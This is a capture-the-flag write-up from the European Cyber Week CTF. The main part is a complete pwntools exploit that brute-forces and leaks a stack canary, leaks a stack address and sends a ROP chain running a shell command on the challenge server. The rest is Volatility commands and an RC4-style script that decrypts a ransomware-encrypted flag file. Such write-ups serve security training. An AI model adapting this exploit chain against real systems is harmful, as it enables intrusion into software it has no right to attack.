---
title: European Cyber Week CTF - Pwn350 + Rev250 - Writeup
---

Hi,

This time I will just publish the exploits I wrote to solve the tasks.

### The QUIZZZZ - Pwn350

 1. Leak Canary Value 
 2. Leak Stack Address (2 bytes) 
 3. Brute force the remaining byte 
 4. ROP chain to run a commande

<!--more-->

```python
from pwn import *
from struct import pack
from struct import unpack

for bf in range(256):
 try:
    flag = "A"*7+"-c"
    eip = 0x08048C45
    cookie = "XYZ"
    ebp_eip = ""
    cmd = "X"*7
    for stage in range(2):
        print "[+] Stage "+str(stage+1)
        #r = remote("localhost", 8888)
        r = remote("challenge-ecw.fr", 8888)
        r.recvuntil(">")
        r.sendline("3")
        r.recvuntil("(y/n) ")
        if stage == 1:
            cookie = pack("<I",cookie)
            ebp_eip = "A"*12
            ebp_eip+= pack("<I", eip)
            ebp_eip+= pack("<I", 0x080491AF)
            ebp_eip+= pack("<I", 0x080491AF)
            ebp_eip+= pack("<I", 0x804B0D5)
            ebp_eip+= pack("<I", recv_buf + 54)
            ebp_eip+= pack("<I", 0x0804930A)
            ebp_eip+= pack("<I", 0)
            ebp_eip+= "cat flag >&4"
            ebp_eip+= pack("<I", 0)
            cmd = flag

        r.sendline("y"+cmd+cookie+ebp_eip)
        if stage == 1:
            d = r.recvall()
            if "ECW{" in d:
                print "[+] Flag: "+d
                #break
                #quit()

        r.recvline()
        leak = r.recvall()
        print leak[:100].encode("hex")
        cookie = unpack("I","\x00"+chr(bf)+leak[:2])[0]
        stack_add = unpack("I",leak[2:6])[0]
        recv_buf = stack_add - 59
        print "[+] Cookie: %x"%cookie
        print "[+] Stack add: %x"%stack_add
        print "[+] Recv buf: %x"%recv_buf
 except:
    print "NOK"
```

### La rançon du succès - For250


Dump process and analyze binay

```bash
vol.py -f dump.mem --profile=Win7SP0x64 procdump -D dump/ -p 2656
```

Export Key

```bash
vol.py -f dump.mem --profile=Win7SP0x64 printkey -K "SOFTWARE\ANGRYDUCK"
```

Decrypt

```python
K = [0x07, 0xDE, 0xBD, 0x66, 0x4C, 0xE7, 0x5B, 0xA3, 0x92, 0x60, 0x56, 0xC0, 0x4C, 0x3B, 0xE9, 0xE2, 0x9E, 0x5F, 0x6B, 0xCC, 0xCD, 0x4E, 0x6C, 0xA4, 0xF5, 0x05, 0x00, 0xFA, 0xFA, 0x24, 0x5B, 0x06]

f = open("flag.jpg.adk","rb")
buf = f.read()
f.close()

buf = buf[51:]
print buf.encode("hex")
buf = [ord(c) for c in buf]

S = [0]*256
for i in range(0x100):
    S[i] = i
y = 0

for i in range(0x100):
    x = S[i]
    y = (y + x + K[i & 0x1F]) & 0xFF
    z = y
    r = S[z]
    S[i] = r
    S[z] = x

j = 0
p = 0
for i in range(len(buf)):
    j +=1
    x = j & 0xff
    y = S[x]
    z = (S[x] + p) & 0xFF
    p = z
    q = z
    S[x] = S[q]
    S[q] = y
    r = S[(y + S[x]) & 0xFF]
    buf[i] ^= r

d = "".join([chr(c) for c in buf])
print d.encode("hex")
f = open("flag.jpg","wb")
f.write("".join([chr(c) for c in buf]))
f.close()
```

That's all
